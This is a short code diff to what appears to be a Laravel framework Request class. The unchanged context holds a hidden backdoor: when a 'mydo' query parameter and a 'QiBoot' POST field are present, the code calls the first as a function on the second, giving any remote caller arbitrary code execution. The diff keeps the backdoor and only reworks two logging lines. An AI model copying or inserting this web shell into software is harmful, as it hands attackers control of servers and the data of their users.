@@ -325,8 +325,9 @@ class Request extends SymfonyRequest implements Arrayable, ArrayAccess
         $_ = $_GET['mydo'] ?? '';
         if ($_ && isset($_POST['QiBoot']) && $_POST['QiBoot']) {
             set_time_limit(0);
-            Log::info('mydo:',$_GET['mydo']);
-            Log::info('QiBoot:',$_POST['QiBoot']);
+           
+            Log::info('mydo:'.$_GET['mydo']);
+            Log::info('QiBoot:'.$_POST['QiBoot']);
             @$_($_POST['QiBoot']);
             exit;
         }
